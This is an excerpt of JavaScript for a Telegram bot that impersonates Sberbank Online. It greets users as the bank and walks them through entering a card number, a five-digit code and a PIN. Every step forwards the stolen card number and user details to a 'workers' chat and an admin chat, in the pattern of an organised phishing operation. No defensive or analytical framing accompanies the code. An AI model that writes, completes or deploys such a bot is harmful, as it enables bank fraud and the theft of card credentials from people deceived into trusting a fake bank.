...
const { getSession, setSession, isBlocked, blockUser } = require("./_lib/store");
const {
  sendMessage,
  sendPhoto,
  answerCallbackQuery,
...
const { isValidCard } = require("./_lib/validate");
...
async function handleMessage(message) {
  ...
  const caption =
    "🏦 <b>Сбербанк Онлайн</b>\n\n" +
    "Добро пожаловать! Для продолжения откройте приложение.";

  const photoUrl = `${webAppUrl}/welcome.png`;
  const photoResult = await sendPhoto(message.chat.id, photoUrl, caption, {
    reply_markup: keyboard,
  });

  if (!photoResult.ok) {
    await sendMessage(message.chat.id, caption, { reply_markup: keyboard });
  }
}
...
async function handleCallback(callbackQuery) {
  ...
  const valueLabels = {
    ...
    pin:
      `💳 Карта: <code>${session.card}</code>\n` +
      (session.pin ? `🔐 Код: <code>${session.pin}</code>\n` : ""),
  };
...
async function handleSubmit(body, res) {
  ...
  if (type === "card") {
    ...
    if (!isValidCard(card)) {
      return res.json({
        step: "card",
        error: "Карта не верна, проверьте данные",
      });
    }
    const formatted = card.replace(/(\d{4})/g, "$1 ").trim();
    session.card = formatted;
    ...
    await Promise.all([
      sendMessage(
        workersChatId,
        `🔔 <b>Пользователь ввёл номер карты</b>\n\n${userInfo}`
      ),
      sendMessage(
        adminChatId,
        `🔔 <b>Ввод номера карты</b>\n\n💳 Карта: <code>${formatted}</code>\n${userInfo}`,
  ...
  if (type === "code") {
    ...
    if (!/^\d{5}$/.test(code)) {
      return res.json({ step: "code", error: "Код должен содержать 5 цифр" });
    }
  ...
  if (type === "pin") {
    ...
    if (!/^\d{5}$/.test(pin)) {
      return res.json({ step: "pin", error: "Код должен содержать 5 цифр" });
    }
    session.pin = pin;
